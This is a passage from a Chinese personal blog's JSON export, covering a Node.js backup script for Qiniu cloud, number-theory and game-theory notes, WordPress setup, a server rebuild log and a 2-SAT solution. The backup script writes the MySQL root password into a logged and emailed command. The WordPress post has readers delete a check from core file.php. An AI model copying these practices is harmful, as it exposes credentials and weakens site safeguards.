代码\n\n使用node.js进行编写的脚本，执行后可以将数据库导出，并将网站文件夹打包压缩，上传到七牛云，执行完毕后还会进行邮件通知。以下为具体代码，需要手动安装模块，伸手党或使用方法直接看下面\n\n```javascript\nvar accessKey = '';\nvar secretKey = '';\nvar bucket='';\nvar sitePath=\"\";\nvar DBname=\"\";\nvar DBpwd=\"\";\nvar mailHost=\"\";\nvar mailPort=;\nvar mailUser=\"\";\nvar mailPwd=\"\";\nvar mailTo=\"\";\n\nvar log='';\nconst sd = require('silly-datetime');\nfunction addLog(str){\n    const time=sd.format(new Date(), 'YYYY-MM-DD HH:mm');\n    log+='['+time+\"]\"+str+'<br>';\n    console.log('['+time+\"]\"+str+'\\n');\n}\n\nvar fs      = require('fs');\nvar path    = require('path');\nvar archiver  = require('archiver');\nconst { toNamespacedPath } = require('path');\nfunction zipFolder(sourceFolder, destZip, subdir) {\n    // init\n    var output = fs.createWriteStream(destZip);\n    var archive = archiver('zip', {\n        zlib: { level: 9 }\n    });\n\n    // on\n    output.on('close', function () {\n        fs.stat(\"site.zip\", function (error, stats) {\n            addLog(\"网站文件压缩完毕，压缩文件大小：\"+stats.size/1024/1024+'MB');\n            upLoadSite();\n        })\n    });\n    archive.on('error', function (err) {\n        addLog(\"网站文件压缩失败：\"+err);\n        toEnd();\n    });\n\n    // zip\n    archive.pipe(output);\n    archive.directory(sourceFolder, subdir ? sourceFolder.substr(path.dirname(sourceFolder).length + 1) : false);\n    archive.finalize();\n}\n\naddLog(\"备份任务开始执行\");\naddLog(\"正在导出数据库\");\nconst childProcess=require('child_process');\nlet cmd=\"mysqldump -uroot -p\"+DBpwd+\" \"+DBname+\">\"+sitePath+\"\\\\database.sql\";\naddLog(\"执行命令：\"+cmd);\nchildProcess.exec(cmd,(error, stdout, stderr)=>{\n    fs.stat(sitePath+\"\\\\database.sql\", function (error, stats) {\n        addLog(\"数据库大小：\"+stats.size/1024+'KB');\n        addLog(\"正在打包站点数据\");\n        zipFolder(sitePath,\"site.zip\",true);\n    })\n});\n\nvar qiniu      = require('qiniu');\nfunction upLoadSite(){\n    addLog(\"准备上传\");\n    var mac = new qiniu.auth.digest.Mac(accessKey, secretKey);\n    var options = {\n        scope: bucket+\":site.zip\",\n        expires: 18000\n    };\n    var putPolicy = new qiniu.rs.PutPolicy(options);\n    var uploadToken=putPolicy.uploadToken(mac);\n    var config = new qiniu.conf.Config();\n    var formUploader = new qiniu.form_up.FormUploader(config);\n    var putExtra = new qiniu.form_up.PutExtra();\n    addLog(\"开始上传\");\n\n    //toEnd();\n    //return;\n    formUploader.putFile(uploadToken, 'site.zip', 'site.zip', putExtra, function (respErr,\n        respBody, respInfo) {\n        if (respErr) {\n            addLog(\"遇到未知错误\");\n            toEnd();\n        }\n        if (respInfo.statusCode == 200) {\n            addLog(\"上传完成！\");\n            toEnd();\n        }else{\n            addLog(\"遇到未知错误\"+respInfo.statusCode);\n            toEnd();\n        }\n    });\n\n}\n\nconst nodemailer = require('nodemailer');\nfunction toEnd(){\n    let transporter = nodemailer.createTransport({\n        host: mailHost,\n        port: mailPort, // SMTP 端口\n        auth: {   //发送者的账户和授权码\n            user: mailUser, //账户\n            pass: mailPwd, //smtp授权码，到邮箱设置下获取\n        }\n    });\n    let mailOptions = {\n        from: '\"Gcteamo\" <admin@gcteamo.com>', // 发送者昵称和地址\n        to: mailTo, // 接收者的邮箱地址\n        subject: '备份任务执行报告', // 邮件主题\n        html: \"<html><body>网站备份任务执行完毕，下面为执行日志<br><br>\"+log+\"</body></html>\"\n    };\n    //发送邮件\n    transporter.sendMail(mailOptions, (error, info) => {\n        if (error) {\n            return console.log(error);\n        }\n        console.log('邮件发送成功 ID：', info.messageId);\n    });\n    //console.log(log);\n}\n//var mac = new qiniu.auth.digest.Mac(accessKey, secretKey);\n```\n\n## 配置与使用\n\n### 下载\n\n你可以直接下载已经把所有依赖的模块安装好的脚本，下载链接：  \nhttps://www.aliyundrive.com/s/QqAsBAGfXgv\n（由于特殊原因，下载到的文件是图片，你需要把后缀改成.rar，然后将其视为正常的压缩文件解压）\n\n### 配置\n\n打开解压后文件夹中的 `main.js` 文件，填写前11行信息，变量名与说明如下：\n\n1. accessKey：你的七牛云公钥\n2. secretKey：你的七牛云私钥\n3. bucket：你要上传到的七牛云储存的空间名称\n4. sitePath：你网站的目录，注意目录的最后不要带 `\\\\`\n5. DBname：你要备份的数据库的名称\n6. DBpwd：mysql数据库root的密码\n7. mailHost：发件邮箱的SMTP服务器地址\n8. mailPor：SMTP服务器的端口\n9. mailUser：发件邮箱地址\n10. mailPwd：发件邮箱密码\n11. mailTo：要通知的邮箱地址\n\n![填写完毕后大概长这样](https://www.caiwen.work/wp-content/uploads/2022/08/QQ截图20220812180646.png)\n\n### 设置定时任务\n\n你的服务器需要安装node.js才能运行脚本。你可以在命令行中输入 `node -v` 如果出现类似于下面的输出信息，说明你正常安装了node.js\n\n![](https://www.caiwen.work/wp-content/uploads/2022/08/QQ截图20220812183337.png)\n\n将脚本文件打包上传到服务器后，进入 控制面板/管理工具/计划任务。\n\n![](https://www.caiwen.work/wp-content/uploads/2022/08/QQ截图20220811143225.png)\n\n在右边选择 创建任务\n\n![](https://www.caiwen.work/wp-content/uploads/2022/08/QQ截图20220811143249.png)\n\n在最下面勾选这个\n\n![](https://www.caiwen.work/wp-content/uploads/2022/08/QQ截图20220811143614.png)\n\n设置触发器，在里面填写好任务执行频率\n\n![](https://www.caiwen.work/wp-content/uploads/2022/08/QQ截图20220811143549.png)\n\n设置操作，按照下面填写  \n（添加参数中填写脚本的路径）\n\n![](https://www.caiwen.work/wp-content/uploads/2022/08/QQ截图20220811143627.png)\n\n成功添加\n\n![](https://www.caiwen.work/wp-content/uploads/2022/08/QQ截图20220811144222.png)\n\n点击旁边的运行，测试一下\n\n![](https://www.caiwen.work/wp-content/uploads/2022/08/QQ截图20220812184133.png)\n\n如果一切顺利，就可以在大约5分钟后收到任务执行成功的通知邮件\n\n![](https://www.caiwen.work/wp-content/uploads/2022/08/QQ截图20220812184332.png)\n\n","summary":"在windows系统上使用php_study建站，为了备份，使用windows服务，每天执行nodejs脚本将数据备份到七牛云","key":["php_study","备份","七牛云","windows","node.js"],"tags":[],"path":["建站","使用七牛云备份网站.md"],"background":"https://www.caiwen.work/wp-content/uploads/2022/08/QQ截图20220812184332.png","recommend":false,"status":"discard"},{"type":"Article","title":"卷积与反演","id":"juan-ji-fan-yan","createTime":"2022-08-11T06:02:00.000Z","updateTime":"2025-09-05T13:34:05.919Z","content":"\n## 狄利克雷卷积\n\n$$(f\\ast g)(n)=\\sum_{d|n}f(d)g(\\frac{n}{d}) （d为n的因子）$$\n\n称为 $f(x)$ 和 $g(x)$ 在n上的卷积\n\n有以下性质\n\n1. $f\\ast g=g\\ast f$\n\n2. $(f\\ast g)\\ast h=f\\ast (g\\ast h)$\n\n3. $(f+g)\\ast h=f\\ast h + g \\ast h$\n\n4. $\\mu \\ast I=\\varepsilon $  \n（$\\varepsilon(n)=[n=1]$ （仅在n=1时为1，否则为0））  \n   （$I(n)=1$）\n\n5. $\\varphi \\ast I=id$  \n   （$id(n)=n$）\n\n6. $\\mu \\ast id=\\varphi$\n\n其中上面的第四五个性质最为常用，我们有比较直观的形式\n\n$$[n=1]=\\sum_{d|n} \\mu(d)$$\n\n$$f(x)=\\sum_{d|f(x)}\\varphi(d)$$\n\n## 反演\n\n与gcd有关的问题常用莫比乌斯反演和欧拉反演\n\n### 莫比乌斯反演\n\n有判断函数常用莫比乌斯反演\n\n$$\\sum_{i=1}^{n}\\sum_{j=1}^{m}[gcd(i,j)=k]$$\n\n变形\n\n$$\\sum_{i=1}^{\\left [ \\frac{n}{k}  \\right ] } \\sum_{j=1}^{\\left [ \\frac{m}{k}  \\right ] } [gcd(i,j)=1]$$\n\n由莫比乌斯反演可得\n\n$$\\sum_{i=1}^{\\left [ \\frac{n}{k}  \\right ] } \\sum_{j=1}^{\\left [ \\frac{m}{k}  \\right ] }\\sum_{d|gcd(i,j)}\\mu (d)$$\n\n> $d|gcd(i,j)$，则可推出 $d|i$ 且 $d|j$\n\n所以交换求和顺序\n\n$$\\sum_{d=1}^{\\left [ \\frac{n}{k}  \\right ] }\\mu (d)\\sum_{i=1}^{\\left [ \\frac{n}{kd}  \\right ] } \\sum_{j=1}^{\\left [ \\frac{m}{kd}  \\right ] }$$\n\n$$\\sum_{d=1}^{\\left [ \\frac{n}{k}  \\right ] }\\mu (d)\\left [ \\frac{m}{kd}  \\right ] \\left [ \\frac{n}{kd}  \\right ] $$\n\n### 欧拉反演\n\ngcd求和常用欧拉反演\n\n$$\\sum_{i=1}^{n}\\sum_{j=1}^{m}gcd(i,j)$$\n\n由欧拉反演可得\n\n$$\\sum_{i=1}^{n} \\sum_{j=1}^{m} \\sum_{d|gcd(i,j)} \\varphi (d)$$\n\n交换求和顺序\n\n$$\\sum_{d=1}^{n} \\varphi (d) \\sum_{i=1}^{\\left [ \\frac{n}{d} \\right ]  } \\sum_{j=1}^{\\left [ \\frac{m}{d} \\right ]  }$$\n\n$$\\sum_{d=1}^{n} \\varphi (d) \\left [ \\frac{n}{d}  \\right ] \\left [ \\frac{m}{d}  \\right ] $$\n\n## 杜教筛\n\n求\n\n$$\\sum_{i=1}^{n}f(i)=s(n)$$\n\n其中 $f(i)$ 为积性函数\n\n再找一个积性函数 $g$ ，考虑狄利克雷卷积\n\n$$\\sum_{i=1}^{n}(f \\ast g)(i)$$\n\n$$\\sum_{i=1}^{n}\\sum_{d|i}f(d)g(\\frac{i}{d})$$\n\n为了更好地处理我们有 $\\frac{i}{d}=k$ 考虑主要枚举k，$k\\in \\left [ 1,n \\right ] $；再枚举d，$d\\in \\left [ 1,\\frac{n}{k} \\right ] $，然后就有下面的变形\n\n$$\\sum_{d=1}^{n}g(d)\\sum_{i=1}^{\\left [ \\frac{n}{d}  \\right ] }f(i)$$\n\n$$\\sum_{d=1}^{n}g(d)s(\\left [ \\frac{n}{d}  \\right ] )$$\n\n然后有\n\n$$g(1)s(n)=\\sum_{i=1}^{n}g(i)s(\\left [ \\frac{n}{i}  \\right ] )-\\sum_{i=2}^{n}g(i)s(\\left [ \\frac{n}{i}  \\right ] )$$\n\n$$g(1)s(n)=\\sum_{i=1}^{n}(f \\ast g)(i)-\\sum_{i=2}^{n}g(i)s(\\left [ \\frac{n}{i}  \\right ] )$$\n\n选择合适的 $g$，可以消掉 $g(1)$ 并且方便地求出 $\\sum_{i=1}^{n}(f \\ast g)(i)$，$\\sum_{i=2}^{n}g(i)$ 通过前缀和可以求出，$s(\\left [ \\frac{n}{i}  \\right ] )$可以通过数论分块+递归求出，总时间复杂度 $O(n^{\\frac{3}{4}})$\n\n例如对于 $f=\\mu$ 我们可以选取 $g=I$，$f\\ast g=\\varepsilon$\n\n对于 $f=\\varphi$ 我们可以选取 $g=I$，$f \\ast g =id$\n\n从而达到快速求解\n\n","summary":"狄利克雷卷积、莫比乌斯反演、欧拉反演和杜教筛","key":["狄利克雷卷积","莫比乌斯反演","杜教筛"],"tags":[],"path":["算法竞赛","知识点","卷积与反演.md"],"background":"https://www.caiwen.work/wp-content/uploads/2022/08/QQ截图20220810142323-1.png","recommend":false,"status":"discard"},{"type":"Article","title":"dp做题笔记","id":"dp-note","createTime":"2022-08-07T14:29:00.000Z","updateTime":"2025-09-05T13:34:06.238Z","content":"\n1. P4310  \n   很自然想到可以类比求最长不上升子序列来进行dp。然而 $O(n^2)$ 的复杂度不能通过。看了题解之后才发现，可以考虑什么样的数可以转移到当前枚举到的数。将当前枚举到的数化为二进制，如果这一位上是1，那么之前所有二进制这一位是1的数都可以转移到当前枚举到的数。所以可以设置 $dp[i]$ 表示第i位上是1的数结尾的最长子序列长度。时间复杂度 $O(31n)$\n2. P1772  \n   因为提前知道是dp题，所以开始思考转移方程怎么写。但感觉改变路线会增加花费这一点是有后效性的。最终还是看了题解。状态转移方程：$dp[i]=min(dp[i],dp[j]+k+co[j+1,i]*(i-j))$，$dp[i]$ 表示到第i天最小花费。我们可以枚举哪一天改变了路线。$j$天之前怎么走的路线不管，然后 $j+1$ 天改变路线，从 $j+1$ 天到 $i$ 天都走一条路线。这样搭配最短路即可\n3. P1941  \n   看到题很容易想到了dp怎么写。但是这题的细节问题较多，花了很多时间去调试和思考。然而最后只得了65分，有tle也有wa。  \n   最终还是看了题解，这道题有点背包dp的感觉。感觉状态转移很巧妙，特地记下来\n\n```cpp\n\tmemset(dp,0x3f,sizeof(dp));\n\tfor(int s=1;s<=m;s++) dp[0][s]=0;\n\tfor(int i=1;i<=n;i++){\n\t\t//技巧:对于超过m的都算作m，我们可以在m的上方保留一些范围\n\t\tfor(int j=up[i-1]+1;j<=m+up[i-1];j++){\n\t\t\t//技巧:对于可以进行多次的操作，不要去枚举进行了多少次，而是向下面，类似于完全背包这样\n\t\t\tdp[i][j]=min(dp[i-1][j-up[i-1]]+1,dp[i][j-up[i-1]]+1);\n\t\t}\n\t\t//对应上面的，把m上方的保留区间都归到m上\n\t\tfor(int j=m+1;j<=m+up[i-1];j++){\n\t\t\tdp[i][m]=min(dp[i][m],dp[i][j]);\n\t\t}\n\t\t//很一般的转移\n\t\tfor(int j=1;j<=m-down[i-1];j++){\n\t\t\tdp[i][j]=min(dp[i][j],dp[i-1][j+down[i-1]]);\n\t\t}\n\t\t//技巧:我们可以把没有任何限制的情况下的dp表推出来\n\t\t//     然后再处理不能被转移到的地方\n\t\t//     而不是直接就考虑那个地方不能被转移\n\t\tfor(int j=1;j<=lima[i];j++){\n\t\t\tdp[i][j]=inf;\n\t\t}\n\t\tif(limb[i]){\n\t\t\tfor(int j=limb[i];j<=m;j++){\n\t\t\t\tdp[i][j]=inf;\n\t\t\t}\n\t\t}\n\t}\n```\n\n","summary":"做dp题目时记下的笔记","key":["dp"],"tags":[],"path":["算法竞赛","做题、VP","dp做题笔记.md"],"background":"https://pic.caiwen.work/i/2025/01/22/67909e51b8f1c.jpg","recommend":false,"status":"draft"},{"type":"Article","title":"博弈论","id":"bo-yi-lun","createTime":"2022-08-01T06:12:00.000Z","updateTime":"2025-09-05T13:34:05.825Z","content":"\n## 公平组合游戏\n\n公平组合游戏（ICG）需要满足以下条件\n\n1. 有两名玩家\n2. 两名玩家轮流操作，在一个有限集合内任选一个进行操作，改变游戏当前局面\n3. 一个局面的合法操作，只取决于游戏局面本身且固定存在，与玩家次序或者任何其它因素无关\n4. 无法操作者，即操作集合为空，输掉游戏，另一方获胜\n\n## SG函数\n\n对于一个ICG，我们定义一个函数 $sg(x)$ ,$sg(x)=mex(\\{ sg(y)|x->y \\})$ 即一个状态下的sg函数值为这个状态所能转移到的所有状态的sg，再取mex  \n如果 $sg(x)=0$ 则状态x为必败态，反之为必胜态\n\n对于多个ICG，我们有**Sprague-Grundy定理**：\n\n> 设 $x_1,x_2,...,x_n$ 为ICG的状态，则：  \n> $sg(x_1+x_2+...+x_n)=sg(x_1) \\oplus sg(x_2) \\oplus ... \\oplus sg(x_n)$\n\n## 常见博弈\n\n### Nim\n\n即取石子游戏，有以下情况：\n\n1. 可选步数为1~m的连续整数，则 $sg(x)=x%(m+1)$\n2. 可选步数为任意步，则 $sg(x)=x$\n3. 可选步数为一系列不连续的数，采用打表，预处理sg数组\n\n### 阶梯博弈\n\n![](https://www.caiwen.work/wp-content/uploads/2022/08/0_1313488616cRqz.jpg)  \n每次可以将阶梯上任意多个石子移到下一个阶梯上。无法再移动的一方为输  \n把奇数编号的阶梯拿出来做Nim博弈即可  \n注意有方向，即因为是把石子往前面一个阶梯上移动，所以从前向后进行编号。如果是往后面一个阶梯上移动，就要从后向前编号\n\n### k-Nim\n\nk-nim是Nim的变形，即每次可以从不超过k个堆中取出任意个石子，不能取的一方为输。  \n首先我们把每个堆石子的数量表示为二进制，然后对所有的数逐位判断。如果有一位，所有的数这一位上为1的数量$\\%(k+1)$不为0，则先手必胜。反之先手必输\n\n### anti-Nim\n\n和一般的Nim差不多，不过变成了把最后的石子取完的一方为输。我们有**SJ定理**：\n\n> 先手必胜，当且仅当：  \n> （1）单一游戏中有一个SG大于1，且整个游戏SG不为0  \n> （2）单一游戏中所有的SG小于等于1，且整个游戏SG为0\n\n## 例题\n\n[P2148 [SDOI2009] E&D](https://www.luogu.com.cn/problem/P2148#submit)  \n首先打表找出sg函数的规律\n\n```cpp\nint sg[21][21],vis[21][21];\n\nconst int n=20;\n\nint dfs(int x,int y){\n\tif(vis[x][y]||vis[y][x]) return sg[x][y];\n\tif(x==1&&y==1) return 0;\n\tvector<int> v;\n\t//case1\n\tfor(int i=1;i<x;i++){\n\t\tv.push_back(dfs(i,x-i));\n\t}\n\t//case2\n\tfor(int i=1;i<y;i++){\n\t\tv.push_back(dfs(i,y-i));\n\t}\n\tsort(v.begin(),v.end());\n\tint p=0;\n\tfor(int i:v){\n\t\tif(i<p) continue;\n\t\tif(i!=p){\n\t\t\tbreak;\n\t\t}\n\t\tp++;\n\t}\n\tvis[x][y]=vis[y][x]=true;\n\tsg[x][y]=sg[y][x]=p;\n\treturn p;\n}\n```\n\n得到下表\n\n![](https://www.caiwen.work/wp-content/uploads/2022/08/v2-7cb5ba12b143387b381c6c2405c74657_r.png)\n\n找到规律\n\n![](https://www.caiwen.work/wp-content/uploads/2022/08/v2-1ea2c34a3d82d87c16ccf2e89c33c6cb_720w.png)\n\n实现sg函数\n\n```cpp\nint getSG(int x,int y){\n\tif(x%2==1&&y%2==1){\n\t\treturn 0;\n\t}\n\tif(y%2==0) swap(x,y);\n\tif(y%2==1) y++;\n\treturn getSG(x/2,y/2)+1;\n}\n```\n\n还可以检查一下\n\n```cpp\nfor(int i=1;i<=n;i++){\n\tfor(int j=1;j<=n;j++){\n\t\tif(getSG(i,j)==dfs(i,j)){\n\t\t\tcout<<\"accept\"<<endl;\n\t\t}else{\n\t\t\tcout<<\"wa\"<<endl;\n\t\t}\n\t}\n}\n```\n\n","summary":"公平组合游戏、SG函数、Nim、阶梯博弈、k-Nim以及anti-Nim","key":["博弈论","sg函数","nim","k-nim","anti-nim"],"tags":[],"path":["算法竞赛","知识点","博弈论.md"],"background":"https://www.caiwen.work/wp-content/uploads/2022/08/0_1313488616cRqz.jpg","recommend":false,"status":"draft"},{"type":"Article","title":"WordPress中使用Markdown并支持LaTex","id":"wordpress-markdown-latex","createTime":"2022-07-31T13:10:00.000Z","updateTime":"2025-09-05T13:34:05.022Z","content":"\nwordpress自带的文章编辑器操作比较繁琐，用来随手记笔记的话比较麻烦，还不能插入公式之类的东西。而如果使用markdown记笔记的话，无论是排版还是插入公式都非常轻松。本文就记录一下如何在wordpress中使用markdown，并且支持latex公式，以及中间遇到的问题\n\n## 插件安装\n\n在wordpress后台安装 MathJax-LaTeX 和 WP Githuber MD 这两个插件，并启用\n\n按如下配置MathJax-LaTeX插件\n\n![](https://www.caiwen.work/wp-content/uploads/2022/07/12-1-1024x461.png)\n\n其中`Custom MathJax location?`中填入 `https://cdn.bootcss.com/mathjax/2.7.0/MathJax.js` 这样我们就可以比较快速的加载mathjax的js文件\n\n## LaTex无法显示\n\n在后台写文章时会发现WP Githuber MD的编辑器并不支持显示LaTex，文章保存后在文章界面中MathJax-LaTeX也没有对LaTex进行解析。为此，我们需要进行如下操作\n\n![](https://www.caiwen.work/wp-content/uploads/2022/02/w1.png)\n\n在后台，点击“外观”，选择“主题文件编辑器”，在右侧选择“header.php”\n\n![](https://www.caiwen.work/wp-content/uploads/2022/07/13.png)\n\n在右侧加入如下代码\n\n![](https://www.caiwen.work/wp-content/uploads/2022/07/14.png)\n\n```js\nMathJax.Hub.Config({\n\ttex2jax: {\n\t\tinlineMath: [\n\t\t\t[\"$\", \"$\"],\n\t\t\t[\"\\\\(\", \"\\\\)\"],\n\t\t],\n\t\tprocessEscapes: true,\n\t},\n});\n```\n\n然后点击“更新文件”\n\n然而这时候我遇到了一个问题\n\n![](https://www.caiwen.work/wp-content/uploads/2022/07/6.png)\n\n我们按照以下方法解决，进入网站管理面板，进入“wp-admin/includes”目录，找到“file.php”文件进行编辑\n\n![](https://www.caiwen.work/wp-content/uploads/2022/07/7.png)\n\n使用搜索功能，查找 `is_active`，然后将 `if ( $is_active && .......}` 这一部分代码删除\n\n![](https://www.caiwen.work/wp-content/uploads/2022/07/8.png)\n\n![删除后](https://www.caiwen.work/wp-content/uploads/2022/07/9.png)\n\n然后保存，在回到wordpress后台，点击“更新文件”就可以了\n\n再回到文章界面，LaTex可以正常显示\n\n![修改前](https://www.caiwen.work/wp-content/uploads/2022/07/5.png)\n\n![修改后](https://www.caiwen.work/wp-content/uploads/2022/07/11.png)\n\n## 更好的Markdown体验\n\n但这样一来仍然无法在编辑文章时在旁边的预览看到LaTex公式。为了拥有在洛谷上一样的markdown体验，我将洛谷的markdown编辑器源码下载下来，并加了个自动保存的功能，作为自己的markdown编辑器\n\n![](https://www.caiwen.work/wp-content/uploads/2022/07/15.png)\n\n编辑好后直接把markdown文本复制到wordpress即可。\n\n编辑器网址：https://www.caiwen.work/tools/markdown\n\n::: error 警告\n由于博客已经经过多次搬迁和改动，上述链接已经不可用。\n:::\n\n::: info 更好的方案？\n事实上用WP editor.md这个插件就不用那么麻烦了\n:::\n\n","summary":"记录一下如何在wordpress中使用markdown，并且支持latex公式，以及中间遇到的问题","key":["wordpress","markdown","latex"],"tags":[],"path":["建站","WordPress中使用Markdown并支持LaTex.md"],"background":"https://www.caiwen.work/wp-content/uploads/2022/07/15.png","recommend":false,"status":"discard"},{"type":"Article","title":"博客回归记录","id":"blog-come-back","createTime":"2022-07-25T02:35:00.000Z","updateTime":"2025-09-05T13:34:04.872Z","content":"\n由于胡\\*\\*跑路，先前的博客网站从4月中旬开始无法访问。不过我已经猜到了这一点，所以提前使用UpdraftPlus插件进行了定期的备份，因此并没有造成太大的损失。今天心血来潮决定将博客重建，从下午五点一直搞到晚上九点，中间遇到不少问题，因此水一篇文章来记录。\n\n## 服务器选择\n\n之前在百度上搜索并尝试过很多免费php空间。但这些php空间都有一个共同点：如果要绑定自己的域名，就必须将自己域名的ns服务器设置为他们的。然而我的域名是在cloudflare上买的，更改ns服务器需要购买cf的企业版服务，所以就放弃了。在今天偶然看到一个叫”青云互联“的idc出售低价vps，19元/月，感觉还可以，就下单购买。\n\n不过中间遇到了很多问题。一开始想选择windows server 2008系统，然而安装宝塔很慢，并且又想到好像使用宝塔面板的都是linux系统，因此就又决定使用ubuntu。刚安装好ubuntu，可以通过ssh连接，在服务器后台将密码修改成自己的，就连接不了了，提示 “`connection refused`”，只好使用后台的VNC进行宝塔面板的安装，之后的终端操作都借助宝塔面板上的终端来进行。不过奇怪的是宝塔面板安装好后又可以通过ssh连接了。\n\n## 组件的安装\n\n在安装好宝塔面板后，宝塔面板会弹出提示，可以选择一键安装nginx，php，mysql，然后我就选择了一键安装，并等了一段时间。在全部安装完毕后创建站点，发现无法新建mysql数据库，原因是没有安装mysql。考虑到可能是宝塔面板安装mysql失败，所以决定自己手动安装。安装完毕后又因为莫名其妙的错误导致mysql服务启动失败，在网上大量寻找解决办法，未果。无奈只好重新使用宝塔安装mysql，竟然安装成功。\n\n然后又打算新建站点，点击确定后弹出下面的提示\n\n![](https://www.caiwen.work/wp-content/uploads/2022/07/1.png)\n\n考虑到可能宝塔面板也没有安装好nginx，所以就手动在软件商店里安装了一下，很顺利地解决了\n\n再次新建站点，发现没有安装php，按照上述方法又手动安装了一下php5.6（可见宝塔第一次一键安装并没有安装上）。就在认为成功了，发现php启动失败，提示\n\n> php: error while loading shared libraries: libcares.so.2: cannot open shared object file: No such file or directory\n\n看样子是少了一个库。使用”`apt-get install libcares2`“进行安装，没有找到libcares2，只好又手动安装\n\n在opensuse上下载二进制软件包[^1]，上传到服务器上。因为软件包是rpm格式的，而ubuntu支持deb格式，所以还需要转换。\n\n[^1]: 下载链接：https://software.opensuse.org/download/package?package=libcares2&project=openSUSE%3AFactory\n\n输入”`apt-get install alien`“，然后”`alien libcares2.rpm`“，将其转换为deb格式，再“`dpkg -i libcares2.deb`\"进行安装。安装完毕后仍不能正常启动php，是缺少了链接。”`echo \"/usr/lib64\" >> /etc/ld.so.conf`”，然后“`ldconfig`”重新链接，回到宝塔面板，就可以成功重新启动php了\n\n## 备份还原\n\n在安装好wordpress后，安装UpcraftPlus插件。在安装时又遇到问题：提示需要连接ftp\n\n![](https://www.caiwen.work/wp-content/uploads/2022/07/2.png)\n\n百度一番才知道，这可能是网站的wwwroot目录权限不足，导致wordpress无法写入文件，所以在后台更改了一下权限\n\n![](https://www.caiwen.work/wp-content/uploads/2022/07/3.png)\n\n然后再wp-config.php中加入“`define('FS_METHOD','direct');`”强制wordpress不使用ftp写文件。这样就成功的装上了插件。\n\n之后将之前的备份数据使用这个插件还原。在之前使用UpcraftPlus插件定时备份，将其备份数据发送到邮箱中，这样就可以稳定获取到定时备份。\n\n![](https://www.caiwen.work/wp-content/uploads/2022/07/4.png)\n\n备份还原后整个网站又和之前一模一样了\n\n","summary":"由于胡**跑路，先前的博客网站从4月中旬开始无法访问。本文记录了博客重建的过程。","key":["wordpress","备份","博客","建站"],"tags":[],"path":["记录","博客回归记录.md"],"background":"https://www.caiwen.work/wp-content/uploads/2022/07/4.png","recommend":false,"status":"published"},{"type":"Article","title":"UVA1086 The Ministers' Major Mess","id":"uva1086","createTime":"2022-07-02T08:22:00.000Z","updateTime":"2025-09-05T13:34:05.809Z","content":"\n::: success 说明\n本文作为洛谷UVA1086 The Ministers' Major Mess[^1]的题解，已经在洛谷发布。\n\nhttps://www.luogu.com.cn/problem/solution/UVA1086\n[^1]:UVA1086 The Ministers' Major Mess https://www.luogu.com.cn/problem/UVA1086\n:::\n\n## 题意简述\n\n有 $B$（$1 \\leq B \\leq 100$）个提案和 $M$（$1 \\leq M \\leq 500$）个议员。每个议员可以对 $K$（$1 \\leq K \\leq 100$）个提案投票，作出 **通过** 或者 **否决** 的决定。现在你需要对每个议案的最终结果作出判断，使得每个议员的决定都有超过半数以上和最终结果相吻合。\n\n## 题目分析\n\n首先要注意 $K$ 的范围非常小，我们可以分情况讨论：\n\n$K = 1$ ，那么这个议员的决定必须是最后结果，才能满足 **使得每个议员的决定都有超过半数以上和最终结果相吻合**。\n\n$K=2$ ，此时需要注意 **超过半数以上** 的含义，在原题的 pdf 文档中的英文描述是 **more than half**，这意味着符合的数目要比一半多，不能等于一半。$K=2$ 的时候的一半是 $1$，比一半多意味着两个决定都要与最终吻合。\n\n$K=3$，按照上述思路，需要有至少两个决定与最终结果吻合。也就是说如果有一个决定不吻合了，那么剩下的两个决定都必须吻合。\n\n$K=4$，一半是 $2$，超过一半，也就是 $3$，需要有至少 $3$ 个决定与最终吻合，一个决定不吻合了剩下三个就都需要吻合。\n\n这种如果一个决定不吻合，剩下两个/三个都必须吻合，启示我们可以使用 $2-SAT$ 来解决。\n\n## 代码分析\n\n下面规定 $e$ 表示一个提案，$a$ 表示对这个提案做出的决定。点 $i$ 表示的是提案为**否定**，$false$；点 $i+n$ 表示的是提案为**通过**，$true$。\n\n对于提案最终必须是某种情况，我们可以写个 $must$ 函数：提案 $e$ 最后必须是 $a$ 情况。\n\n```cpp\ninline void must(int e,char a){\n\tif(a=='y'){\n\t\tadd(e,e+n);\n\t}else{\n\t\tadd(e+n,e);\n\t}\n}\n```\n\n想让一个点必须是 $false$，可以让这个点的 $true$ 向这个点的 $false$ 连一条边。另一情况同理。\n\n对于一个提案的决定与最终不符的话，其他决定必须相符的情况，我们可以写个 $op$ 函数（具体含义看代码）。\n\n```cpp\ninline void op(int e1,char a1,int e2,char a2){\n\tif(a1=='y'){\n\t\tif(a2=='y') add(e1,e2+n);\n\t\telse add(e1,e2);\n\t}else{\n\t\tif(a2=='y') add(e1+n,e2+n);\n\t\telse add(e1+n,e2);\n\t}\n}\n```\n\n（定义这两个函数的目的是为了之后的建边的代码好写）\n\n然后建边部分：\n\n```cpp\nfor(int i=1;i<=m;i++){\n\tint k,e1,e2,e3,e4;\n\tchar a1,a2,a3,a4;\n\tcin>>k;\n\tif(k==1){\n\t\tcin>>e1>>a1;\n\t\tmust(e1,a1);\n\t}\n\tif(k==2){\n\t\tcin>>e1>>a1>>e2>>a2;\n\t\tmust(e1,a1);\n\t\tmust(e2,a2);\n\t}\n\tif(k==3){\n\t\tcin>>e1>>a1>>e2>>a2>>e3>>a3;\n\t\top(e1,a1,e2,a2);\n\t\top(e1,a1,e3,a3);\n\n\t\top(e2,a2,e1,a1);\n\t\top(e2,a2,e3,a3);\n\n\t\top(e3,a3,e2,a2);\n\t\top(e3,a3,e1,a1);\n\t}\n\tif(k==4){\n\t\tcin>>e1>>a1>>e2>>a2>>e3>>a3>>e4>>a4;\n\t\top(e1,a1,e2,a2);\n\t\top(e1,a1,e3,a3);\n\t\top(e1,a1,e4,a4);\n\n\t\top(e2,a2,e1,a1);\n\t\top(e2,a2,e3,a3);\n\t\top(e2,a2,e4,a4);\n\n\t\top(e3,a3,e2,a2);\n\t\top(e3,a3,e1,a1);\n\t\top(e3,a3,e4,a4);\n\n\t\top(e4,a4,e2,a2);\n\t\top(e4,a4,e1,a1);\n\t\top(e4,a4,e3,a3);\n\t}\n}\n```\n\n建好边之后就是常规的 $2-SAT$ 解法:\n\n$tarjan$：\n\n```cpp\nint n;\nstack<int> s;\nint low[maxn],dfn[maxn];\nint _time;\nbool lock[maxn];\nint id[maxn];\nint tot;\nvoid dfs(int x);\nvoid tarjan(){\n\tmemset(low,0,sizeof(low));\n\tmemset(dfn,0,sizeof(dfn));\n\t_time=0;\n\tmemset(lock,0,sizeof(lock));\n\tmemset(id,0,sizeof(id));\n\ttot=0;\n\tfor(int i=1;i<=n*2;i++){\n\t\tif(!dfn[i]) 